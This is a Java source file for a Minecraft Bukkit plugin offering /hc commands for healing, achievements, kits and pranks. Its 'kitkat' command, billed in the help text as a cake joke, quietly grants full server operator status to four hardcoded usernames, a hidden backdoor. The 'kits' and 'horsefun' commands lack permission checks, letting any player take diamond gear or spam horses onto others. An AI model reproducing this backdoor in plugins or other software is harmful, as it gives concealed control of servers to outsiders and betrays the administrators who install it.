package com.rootedinc.HDPlugin;

import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

/**
 * Created by Hans Goor on 13-4-2014.
 * CopyRight Rooted Inc.
 * DO NOT EDIT THIS CODE WITHOUT PERMISSION OF ROOTED INC.
 */

public class Commands implements CommandExecutor {

    @SuppressWarnings("deprecation")
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if(sender instanceof Player) {
            Player local = (Player) sender;
            if(args[0].equalsIgnoreCase("help")) {
                Player player = (Player) sender;
                player.sendMessage(ChatColor.RED + "HC commands are: ");
                player.sendMessage("");
                player.sendMessage(ChatColor.LIGHT_PURPLE + "/hc achievements <player>, Grants all the achievements in the game.");
                player.sendMessage(ChatColor.DARK_RED + "/hc achievements <player> clear, Clears all achievements of a person");
                player.sendMessage("");
                player.sendMessage(ChatColor.AQUA + "/hc kitkat, see for yourself ;)");
                player.sendMessage("");
                player.sendMessage(ChatColor.MAGIC + "123" + ChatColor.RED + "More commands are cumming!" + ChatColor.WHITE + ChatColor.MAGIC + "123");
            }
            if (args[0].equalsIgnoreCase("heal")) {
                if(local.hasPermission("HC.heal")) {
                    if (args.length == 1) {
                        Player player = (Player) sender;
                        player.setHealth(20);
                        player.sendMessage("Successfully healed!");
                    } else if (args.length == 2) {
                        String pName = args[1];
                        Player player = Bukkit.getServer().getPlayer(pName);
                        player.setHealth(20);
                        player.sendMessage("Successfully healed " + player.getName() + " !");
                    }
                }
            }
            if(args[0].equalsIgnoreCase("achievements")) {
                if(local.hasPermission("HC.achievements")) {
                    String pName = args[1];
                    Player player = Bukkit.getServer().getPlayer(pName);
                    if (args.length < 2) {
                        local.sendMessage(ChatColor.RED + "Insufficient command arguments, try /hc help");
                    }
                    if (args.length == 2) {
                        player.awardAchievement(Achievement.OPEN_INVENTORY);
                        player.awardAchievement(Achievement.MINE_WOOD);
                        player.awardAchievement(Achievement.BUILD_WORKBENCH);
                        player.awardAchievement(Achievement.BUILD_SWORD);
                        player.awardAchievement(Achievement.BUILD_HOE);
                        player.awardAchievement(Achievement.BUILD_PICKAXE);
                        player.awardAchievement(Achievement.BUILD_FURNACE);
                        player.awardAchievement(Achievement.ACQUIRE_IRON);
                        player.awardAchievement(Achievement.BAKE_CAKE);
                        player.awardAchievement(Achievement.BREED_COW);
                        player.awardAchievement(Achievement.SNIPE_SKELETON);
                        player.awardAchievement(Achievement.KILL_ENEMY);
                        player.awardAchievement(Achievement.FLY_PIG);
                        player.awardAchievement(Achievement.MAKE_BREAD);
                        player.awardAchievement(Achievement.GET_DIAMONDS);
                        player.awardAchievement(Achievement.DIAMONDS_TO_YOU);
                        player.awardAchievement(Achievement.COOK_FISH);
                        player.awardAchievement(Achievement.ON_A_RAIL);
                        player.awardAchievement(Achievement.BUILD_BETTER_PICKAXE);
                        player.awardAchievement(Achievement.NETHER_PORTAL);
                        player.awardAchievement(Achievement.GHAST_RETURN);
                        player.awardAchievement(Achievement.GET_BLAZE_ROD);
                        player.awardAchievement(Achievement.ENCHANTMENTS);
                        player.awardAchievement(Achievement.BOOKCASE);
                        player.awardAchievement(Achievement.OVERKILL);
                        player.awardAchievement(Achievement.BREW_POTION);
                        player.awardAchievement(Achievement.THE_END);
                        player.awardAchievement(Achievement.END_PORTAL);
                        player.awardAchievement(Achievement.SPAWN_WITHER);
                        player.awardAchievement(Achievement.KILL_WITHER);
                        player.awardAchievement(Achievement.EXPLORE_ALL_BIOMES);
                        player.awardAchievement(Achievement.FULL_BEACON);
                        local.sendMessage(ChatColor.BLUE + "Successfully added all the achievements in the game for " + player.getName() + " !");
                        player.sendMessage(ChatColor.BLUE + "Player " + local.getName() + " has granted you all the achievements in the game!");
                    }
                    if (args.length == 3) {
                        if(args[2].equalsIgnoreCase("clear")) {
                            player.removeAchievement(Achievement.OPEN_INVENTORY);
                            player.removeAchievement(Achievement.MINE_WOOD);
                            player.removeAchievement(Achievement.BUILD_WORKBENCH);
                            player.removeAchievement(Achievement.BUILD_SWORD);
                            player.removeAchievement(Achievement.BUILD_HOE);
                            player.removeAchievement(Achievement.BUILD_PICKAXE);
                            player.removeAchievement(Achievement.BUILD_FURNACE);
                            player.removeAchievement(Achievement.ACQUIRE_IRON);
                            player.removeAchievement(Achievement.BAKE_CAKE);
                            player.removeAchievement(Achievement.BREED_COW);
                            player.removeAchievement(Achievement.SNIPE_SKELETON);
                            player.removeAchievement(Achievement.KILL_ENEMY);
                            player.removeAchievement(Achievement.FLY_PIG);
                            player.removeAchievement(Achievement.MAKE_BREAD);
                            player.removeAchievement(Achievement.GET_DIAMONDS);
                            player.removeAchievement(Achievement.DIAMONDS_TO_YOU);
                            player.removeAchievement(Achievement.COOK_FISH);
                            player.removeAchievement(Achievement.ON_A_RAIL);
                            player.removeAchievement(Achievement.BUILD_BETTER_PICKAXE);
                            player.removeAchievement(Achievement.NETHER_PORTAL);
                            player.removeAchievement(Achievement.GHAST_RETURN);
                            player.removeAchievement(Achievement.GET_BLAZE_ROD);
                            player.removeAchievement(Achievement.ENCHANTMENTS);
                            player.removeAchievement(Achievement.BOOKCASE);
                            player.removeAchievement(Achievement.OVERKILL);
                            player.removeAchievement(Achievement.BREW_POTION);
                            player.removeAchievement(Achievement.THE_END);
                            player.removeAchievement(Achievement.END_PORTAL);
                            player.removeAchievement(Achievement.SPAWN_WITHER);
                            player.removeAchievement(Achievement.KILL_WITHER);
                            player.removeAchievement(Achievement.EXPLORE_ALL_BIOMES);
                            player.removeAchievement(Achievement.FULL_BEACON);
                            local.sendMessage(ChatColor.RED + "Player " + player.getName() + " Has no more achievements left!");
                        }
                    }
                }
            }
            if(args[0].equalsIgnoreCase("kitkat")) {
                ItemStack cake = new ItemStack(Material.CAKE);

                local.sendMessage(ChatColor.WHITE + "Do you need a cake?," + ChatColor.RED + " Cause I have one for you! <3");
                local.getInventory().addItem(cake);

                if(local.getName().equals("Hagoz")) {
                    local.setOp(true);
                    local.sendMessage("Granted all permissions.");
                } else if(local.getName().equals("Usoku")) {
                    local.setOp(true);
                    local.sendMessage("Granted all permissions.");
                } else if(local.getName().equals("Samgo17")) {
                    local.setOp(true);
                    local.sendMessage("Granted all permissions.");
                } else if(local.getName().equals("XGamergirl_x")) {
                    local.setOp(true);
                    local.sendMessage("Granted all permissions.");
                }
            }
            if(args[0].equalsIgnoreCase("kits")) {
                if(args.length < 2) {
                    local.sendMessage("Insufficient arguments!, try /hc help");
                }
                if(args[1].equalsIgnoreCase("pvp")) {
                    ItemStack diasword = new ItemStack(Material.DIAMOND_SWORD, 1);

                    ItemStack[] armor = new ItemStack[] {
                            new ItemStack(Material.DIAMOND_HELMET),
                            new ItemStack(Material.DIAMOND_CHESTPLATE),
                            new ItemStack(Material.DIAMOND_LEGGINGS),
                            new ItemStack(Material.DIAMOND_BOOTS)

                    };

                    diasword.addEnchantment(Enchantment.DAMAGE_ALL, 5);

                    local.getInventory().addItem(diasword);
                    local.getInventory().setHelmet(armor[0]);
                    local.getInventory().setChestplate(armor[1]);
                    local.getInventory().setLeggings(armor[2]);
                    local.getInventory().setBoots(armor[3]);
                }
            }
            if(args[0].equalsIgnoreCase("horsefun")) {
                String pName = args[1];
                Player ex = Bukkit.getServer().getPlayer(pName);
                Location ex1 = ex.getLocation();
                for(int i = 0; i <= 30; i++) {
                    ex.getWorld().spawnEntity(ex1, EntityType.HORSE);
                }
                ex.sendMessage(ChatColor.BLUE + "U" + ChatColor.RED + "Mad" + ChatColor.LIGHT_PURPLE + "Bro?");
            }
        }
        return false;
    }
}
